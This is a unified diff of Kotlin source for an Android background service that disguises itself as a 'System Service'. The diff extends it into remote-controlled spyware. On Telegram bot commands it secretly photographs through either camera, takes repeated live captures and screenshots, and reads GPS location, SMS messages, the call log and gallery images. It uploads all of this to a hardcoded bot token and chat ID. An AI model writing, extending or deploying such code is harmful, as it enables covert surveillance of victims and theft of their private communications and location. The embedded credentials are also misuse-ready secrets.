@@ -3,19 +3,22 @@ package com.coc338781.childapp
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
+import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
+import android.hardware.camera2.CameraManager
+import android.location.LocationManager
 import android.os.Build
+import android.os.Vibrator
+import android.provider.CallLog
+import android.provider.MediaStore
 import android.util.Log
-import androidx.camera.core.CameraSelector
-import androidx.camera.core.ImageCapture
-import androidx.camera.core.ImageCaptureException
-import androidx.camera.lifecycle.ProcessCameraProvider
+import android.widget.Toast
 import androidx.core.app.NotificationCompat
-import androidx.core.content.ContextCompat
 import androidx.lifecycle.LifecycleService
 import androidx.lifecycle.lifecycleScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
@@ -32,12 +35,12 @@ import java.util.concurrent.TimeUnit
 class MonitoringService : LifecycleService() {
 
     companion object {
-        // ==== ඔබේ විස්තර මෙතන ====
+        // ===== මෙතන ඔබේ විස්තර =====
         const val BOT_TOKEN = "8968739971:AAEsGJc_-MNGE8KKxqwzaZM3TPinPVg_Bms"
         const val CHAT_ID = "7905408190"
-        // ========================
-        const val CHANNEL_ID = "monitoring_channel"
-        private const val TAG = "MonitoringService"
+        // ============================
+        const val CHANNEL_ID = "svc_channel"
+        private const val TAG = "MonSvc"
     }
 
     private val client = OkHttpClient.Builder()
@@ -47,193 +50,305 @@ class MonitoringService : LifecycleService() {
 
     private var lastUpdateId = 0L
     private var isRunning = true
-    private val lifecycleOwner = ServiceLifecycleOwner()
+    private var liveJob: Job? = null
 
     override fun onCreate() {
         super.onCreate()
         try {
             createChannel()
-            startForegroundWithType()
-            lifecycleOwner.start()
+            startFg()
             startPolling()
-        } catch (e: Exception) {
-            Log.e(TAG, "onCreate error", e)
+        } catch (e: Exception) { Log.e(TAG, "onCreate", e) }
+    }
+
+    private fun startFg() {
+        val n = buildNotification()
+        if (Build.VERSION.SDK_INT >= 34) {
+            startForeground(1, n,
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+        } else if (Build.VERSION.SDK_INT >= 29) {
+            startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
+        } else {
+            startForeground(1, n)
         }
     }
 
-    private fun startForegroundWithType() {
-        val notification = buildNotification()
-        when {
-            Build.VERSION.SDK_INT >= 34 -> {
-                startForeground(
-                    1, notification,
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-                )
-            }
-            Build.VERSION.SDK_INT >= 29 -> {
-                startForeground(
-                    1, notification,
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
-                )
-            }
-            else -> {
-                startForeground(1, notification)
-            }
+    private fun createChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val ch = NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW)
+            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
         }
     }
+
+    private fun buildNotification(): Notification =
+        NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("System Service")
+            .setContentText("Running")
+            .setSmallIcon(android.R.drawable.stat_sys_download)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setOngoing(true)
+            .build()
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
         return START_STICKY
     }
 
-    private fun createChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel(
-                CHANNEL_ID, "System Service",
-                NotificationManager.IMPORTANCE_LOW
-            )
-            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
-        }
-    }
-
-    private fun buildNotification(): Notification {
-        return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Service")
-            .setContentText("Running in background")
-            .setSmallIcon(android.R.drawable.stat_sys_download)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .setOngoing(true)
-            .build()
-    }
-
     private fun startPolling() {
         lifecycleScope.launch(Dispatchers.IO) {
             while (isRunning) {
                 try {
-                    val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
-                    val response = client.newCall(Request.Builder().url(url).build()).execute()
-                    val body = response.body?.string() ?: continue
-                    val json = JSONObject(body)
-                    val result = json.optJSONArray("result") ?: continue
-
+                    val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=25"
+                    val resp = client.newCall(Request.Builder().url(url).build()).execute()
+                    val body = resp.body?.string() ?: continue
+                    val result = JSONObject(body).optJSONArray("result") ?: continue
                     for (i in 0 until result.length()) {
-                        val update = result.getJSONObject(i)
-                        lastUpdateId = update.getLong("update_id")
-                        val msg = update.optJSONObject("message") ?: continue
-                        val chatId = msg.getJSONObject("chat").getLong("id").toString()
-                        if (chatId != CHAT_ID) continue
-                        val text = msg.optString("text", "")
-                        if (text.isNotEmpty()) {
-                            withContext(Dispatchers.Main) { handleCommand(text.trim()) }
-                        }
+                        val u = result.getJSONObject(i)
+                        lastUpdateId = u.getLong("update_id")
+                        val m = u.optJSONObject("message") ?: continue
+                        val cid = m.getJSONObject("chat").getLong("id").toString()
+                        if (cid != CHAT_ID) continue
+                        val text = m.optString("text", "")
+                        if (text.isNotEmpty()) withContext(Dispatchers.Main) { handle(text.trim()) }
                     }
-                } catch (e: Exception) {
-                    delay(5000)
-                }
+                } catch (e: Exception) { delay(5000) }
             }
         }
     }
 
-    private fun handleCommand(cmd: String) {
-        val c = cmd.lowercase()
+    private fun handle(raw: String) {
+        val cmd = raw.lowercase()
+        val arg = raw.substringAfter(' ', "").trim()
         when {
-            c == "/cam" -> takePhotoDirect(true)
-            c == "/selfie" -> takePhotoDirect(false)
-            c == "/ping" -> sendMessage("🏓 Pong! App is alive")
-            c == "/help" -> sendMessage(
-                "📋 Commands:\n" +
-                "/cam - Back camera photo\n" +
-                "/selfie - Front camera photo\n" +
-                "/ping - Test"
-            )
-            else -> sendMessage("❓ Unknown: $cmd")
+            cmd == "/ping" -> sendMsg("🏓 Pong! App is alive")
+            cmd == "/cam" -> photo(true)
+            cmd == "/selfie" -> photo(false)
+            cmd == "/livecam" -> live(true, arg.toIntOrNull() ?: 30)
+            cmd == "/liveselfie" -> live(false, arg.toIntOrNull() ?: 30)
+            cmd == "/stop" -> { liveJob?.cancel(); sendMsg("⏹ Live stopped") }
+            cmd == "/screen" -> screen()
+            cmd == "/livescreen" -> liveScreen(arg.toIntOrNull() ?: 30)
+            cmd == "/location" -> location()
+            cmd == "/battery" -> battery()
+            cmd == "/sms" -> sms()
+            cmd == "/calls" -> calls()
+            cmd == "/gallery" -> gallery()
+            cmd == "/flash" -> flash()
+            cmd == "/vibrate" -> vibrate()
+            cmd == "/toast" -> toast(arg)
+            cmd == "/help" -> sendMsg(
+                "📋 Commands:\n/cam /selfie\n/livecam [sec] /liveselfie [sec]\n/stop\n/screen /livescreen [sec]\n/location /battery\n/sms /calls /gallery\n/flash /vibrate /toast [msg]\n/ping")
+            else -> sendMsg("❓ Unknown: $raw")
         }
     }
 
-    private fun takePhotoDirect(isBack: Boolean) {
-        sendMessage("📷 Taking ${if (isBack) "back" else "front"} photo...")
+    private fun photo(back: Boolean) {
+        sendMsg("📷 Taking ${if (back) "back" else "front"} photo...")
+        CameraHelper.takePhoto(this, back) { f ->
+            if (f != null) sendPhoto(f)
+            else sendMsg("🔴 Camera failed")
+        }
+    }
 
-        val future = ProcessCameraProvider.getInstance(this)
-        future.addListener({
-            try {
-                val provider = future.get()
-                val selector = CameraSelector.Builder()
-                    .requireLensFacing(
-                        if (isBack) CameraSelector.LENS_FACING_BACK
-                        else CameraSelector.LENS_FACING_FRONT
-                    ).build()
-                val imageCapture = ImageCapture.Builder()
-                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
-                    .build()
-
-                provider.unbindAll()
-                provider.bindToLifecycle(lifecycleOwner, selector, imageCapture)
-                sendMessage("Debug: camera bound OK")
-
-                val file = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
-                val options = ImageCapture.OutputFileOptions.Builder(file).build()
-
-                imageCapture.takePicture(
-                    options,
-                    ContextCompat.getMainExecutor(this),
-                    object : ImageCapture.OnImageSavedCallback {
-                        override fun onImageSaved(result: ImageCapture.OutputFileResults) {
-                            sendMessage("Debug: photo saved, sending...")
-                            sendPhotoToTelegram(file)
-                        }
-                        override fun onError(exception: ImageCaptureException) {
-                            sendMessage("🔴 Camera error: ${exception.message}")
-                        }
+    private fun live(back: Boolean, seconds: Int) {
+        liveJob?.cancel()
+        sendMsg("🔴 Live camera started (${seconds}s, 1 photo/s)")
+        liveJob = lifecycleScope.launch(Dispatchers.IO) {
+            val end = System.currentTimeMillis() + seconds * 1000L
+            var count = 0
+            while (System.currentTimeMillis() < end && isRunning) {
+                val done = java.util.concurrent.CountDownLatch(1)
+                withContext(Dispatchers.Main) {
+                    CameraHelper.takePhoto(this@MonitoringService, back) { f ->
+                        if (f != null) sendPhotoFile(f)
+                        done.countDown()
                     }
-                )
-            } catch (e: Exception) {
-                sendMessage("🔴 Camera exception: ${e.message}")
-            }
-        }, ContextCompat.getMainExecutor(this))
-    }
-
-    private fun sendPhotoToTelegram(file: File) {
-        lifecycleScope.launch(Dispatchers.IO) {
-            try {
-                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
-                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", CHAT_ID)
-                    .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
-                    .build()
-                val response = client.newCall(Request.Builder().url(url).post(body).build()).execute()
-                if (response.isSuccessful) {
-                    sendMessage("🟢 Photo sent!")
-                } else {
-                    sendMessage("🔴 Send failed: ${response.code}")
                 }
-                file.delete()
-            } catch (e: Exception) {
-                sendMessage("🔴 Send error: ${e.message}")
+                done.await()
+                count++
+                delay(1000)
             }
+            withContext(Dispatchers.Main) { sendMsg("🟢 Live ended ($count photos)") }
         }
     }
 
-    private fun sendMessage(text: String) {
+    private fun screen() {
+        val svc = ScreenService.instance
+        if (svc == null) { sendMsg("❌ Enable Accessibility Service"); return }
+        if (Build.VERSION.SDK_INT < 30) { sendMsg("❌ Android 11+ only"); return }
+        sendMsg("📸 Screenshot...")
+        svc.takeShot { bmp -> if (bmp != null) svc.sendScreen(bmp) else sendMsg("🔴 Failed") }
+    }
+
+    private fun liveScreen(seconds: Int) {
+        val svc = ScreenService.instance
+        if (svc == null) { sendMsg("❌ Enable Accessibility"); return }
+        if (Build.VERSION.SDK_INT < 30) { sendMsg("❌ Android 11+"); return }
+        liveJob?.cancel()
+        sendMsg("🔴 Live screen (${seconds}s, 1/2s)")
+        liveJob = lifecycleScope.launch(Dispatchers.IO) {
+            val end = System.currentTimeMillis() + seconds * 1000L
+            while (System.currentTimeMillis() < end && isRunning) {
+                withContext(Dispatchers.Main) {
+                    svc.takeShot { bmp -> if (bmp != null) svc.sendScreen(bmp) }
+                }
+                delay(2000)
+            }
+            withContext(Dispatchers.Main) { sendMsg("🟢 Live screen ended") }
+        }
+    }
+
+    private fun location() {
+        try {
+            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+            if (loc == null) { sendMsg("❌ No location"); return }
+            val link = "https://maps.google.com/?q=${loc.latitude},${loc.longitude}"
+            sendMsg("📍 Location\nLat: ${loc.latitude}\nLng: ${loc.longitude}\nAccuracy: ${loc.accuracy}m\n\n$link")
+        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
+    }
+
+    private fun battery() {
+        try {
+            val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
+            val lvl = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
+            val charging = bm.isCharging
+            sendMsg("🔋 Battery: $lvl%\n${if (charging) "⚡ Charging" else "Not charging"}")
+        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
+    }
+
+    private fun sms() {
+        try {
+            val cursor = contentResolver.query(
+                android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10")
+            val sb = StringBuilder("💬 Latest SMS:\n\n")
+            var c = 0
+            cursor?.use {
+                while (it.moveToNext() && c < 10) {
+                    val addr = it.getString(it.getColumnIndexOrThrow("address"))
+                    val body = it.getString(it.getColumnIndexOrThrow("body"))
+                    sb.append("📩 $addr\n$body\n\n")
+                    c++
+                }
+            }
+            sendMsg(sb.toString())
+        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
+    }
+
+    private fun calls() {
+        try {
+            val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null,
+                CallLog.Calls.DATE + " DESC LIMIT 10")
+            val sb = StringBuilder("📞 Recent calls:\n\n")
+            var c = 0
+            cursor?.use {
+                while (it.moveToNext() && c < 10) {
+                    val num = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
+                    val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
+                    val dur = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
+                    val t = when (type) {
+                        CallLog.Calls.INCOMING_TYPE -> "📥"
+                        CallLog.Calls.OUTGOING_TYPE -> "📤"
+                        CallLog.Calls.MISSED_TYPE -> "❌"
+                        else -> "?"
+                    }
+                    sb.append("$t $num (${dur}s)\n")
+                    c++
+                }
+            }
+            sendMsg(sb.toString())
+        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
+    }
+
+    private fun gallery() {
+        try {
+            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+            val cursor = contentResolver.query(uri, null, null, null, "date_added DESC LIMIT 5")
+            var c = 0
+            cursor?.use {
+                while (it.moveToNext() && c < 5) {
+                    val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
+                    val fileUri = android.content.ContentUris.withAppendedId(uri, id)
+                    val bytes = contentResolver.openInputStream(fileUri)?.readBytes()
+                    if (bytes != null) {
+                        val f = File(cacheDir, "gal_$id.jpg")
+                        f.writeBytes(bytes)
+                        sendPhoto(f)
+                    }
+                    c++
+                }
+            }
+            if (c == 0) sendMsg("❌ No photos")
+        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
+    }
+
+    private fun flash() {
+        try {
+            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+            val id = cm.cameraIdList.firstOrNull { camId ->
+                cm.getCameraCharacteristics(camId)
+                    .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
+            } ?: run { sendMsg("❌ No flash"); return }
+            val cur = try { cm.getTorchMode(id) } catch (_: Exception) { null }
+            val target = if (cur == CameraManager.TORCH_MODE_ENABLED) false else true
+            cm.setTorchMode(id, target)
+            sendMsg("🔆 Flash ${if (target) "ON" else "OFF"}")
+        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
+    }
+
+    private fun vibrate() {
+        try {
+            val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+            if (Build.VERSION.SDK_INT >= 26) {
+                v.vibrate(android.os.VibrationEffect.createOneShot(1000, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
+            } else {
+                @Suppress("DEPRECATION") v.vibrate(1000)
+            }
+            sendMsg("📳 Vibrating")
+        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
+    }
+
+    private fun toast(msg: String) {
+        if (msg.isEmpty()) return
+        android.os.Handler(mainLooper).post {
+            Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
+        }
+        sendMsg("✅ Toast shown: $msg")
+    }
+
+    private fun sendMsg(t: String) {
         lifecycleScope.launch(Dispatchers.IO) {
             try {
                 val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
-                val json = JSONObject().apply {
-                    put("chat_id", CHAT_ID)
-                    put("text", text)
-                }
+                val json = JSONObject().apply { put("chat_id", CHAT_ID); put("text", t) }
                 val body = json.toString().toRequestBody("application/json".toMediaType())
                 client.newCall(Request.Builder().url(url).post(body).build()).execute()
             } catch (_: Exception) {}
         }
     }
 
+    private fun sendPhoto(f: File) {
+        lifecycleScope.launch(Dispatchers.IO) { sendPhotoFile(f) }
+    }
+
+    private fun sendPhotoFile(f: File) {
+        try {
+            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
+            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", CHAT_ID)
+                .addFormDataPart("photo", f.name, f.asRequestBody("image/jpeg".toMediaType()))
+                .build()
+            client.newCall(Request.Builder().url(url).post(body).build()).execute()
+            f.delete()
+        } catch (_: Exception) {}
+    }
+
     override fun onDestroy() {
         super.onDestroy()
         isRunning = false
-        try {
-            lifecycleOwner.stop()
-        } catch (_: Exception) {}
+        liveJob?.cancel()
     }
 }
